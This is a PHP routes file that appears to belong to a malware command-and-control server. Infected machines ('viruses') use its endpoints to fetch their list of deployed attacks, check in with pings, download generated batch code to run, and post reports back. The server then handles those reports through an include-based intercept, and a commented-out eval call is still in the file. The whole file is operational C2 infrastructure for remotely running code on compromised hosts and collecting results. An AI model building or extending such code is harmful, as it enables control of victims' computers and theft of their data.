<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Header;
use Kelvinho\Virus\Virus\Virus;

// routes for viruses
$router->getMulti(["vrs/*/aks", "viruses/*/attacks"], function () use ($requestData) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (Virus::exists($virus_id)) {
        echo join("\n", Virus::getAttacks($virus_id, AttackInterface::STATUS_DEPLOYED));
        Header::ok();
    } else {
        Header::forbidden();
    }
});
$router->getMulti(["vrs/*/ping", "viruses/*/ping"], function () use ($requestData, $virusFactory) {
    $virus_id = $requestData->getExplodedPath()[1];
    if (Virus::exists($virus_id)) {
        $virus = $virusFactory->get($virus_id);
        $virus->ping();
        Header::ok();
    } else {
        Header::forbidden();
    }
});
$router->getMulti(["vrs/*/aks/*/code", "viruses/*/attacks/*/code"], function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (AttackInterface::exists($attack_id)) {
        $attack = $attackFactory->get($attack_id);
        echo $attack->generateBatchCode();
        Header::ok();
    } else {
        Header::forbidden();
    }
});
$router->postMulti(["vrs/*/aks/*/report", "viruses/*/attacks/*/report"], function () use ($requestData, $virusFactory, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (AttackInterface::exists($attack_id)) {
        $attack = $attackFactory->get($attack_id);
        //eval($attack->generateIntercept());
        $attack->includeIntercept();
        Header::ok();
    } else {
        Header::forbidden();
    }
});
$router->get("vrs/*/aks/*/extras/*", function () use ($requestData, $attackFactory) {
    $attack_id = $requestData->getExplodedPath()[3];
    if (AttackInterface::exists($attack_id)) {
        $attack = $attackFactory->get($attack_id);
        $attack->processExtras($requestData->getExplodedPath()[5]);
        Header::ok();
    } else {
        Header::forbidden();
    }
});
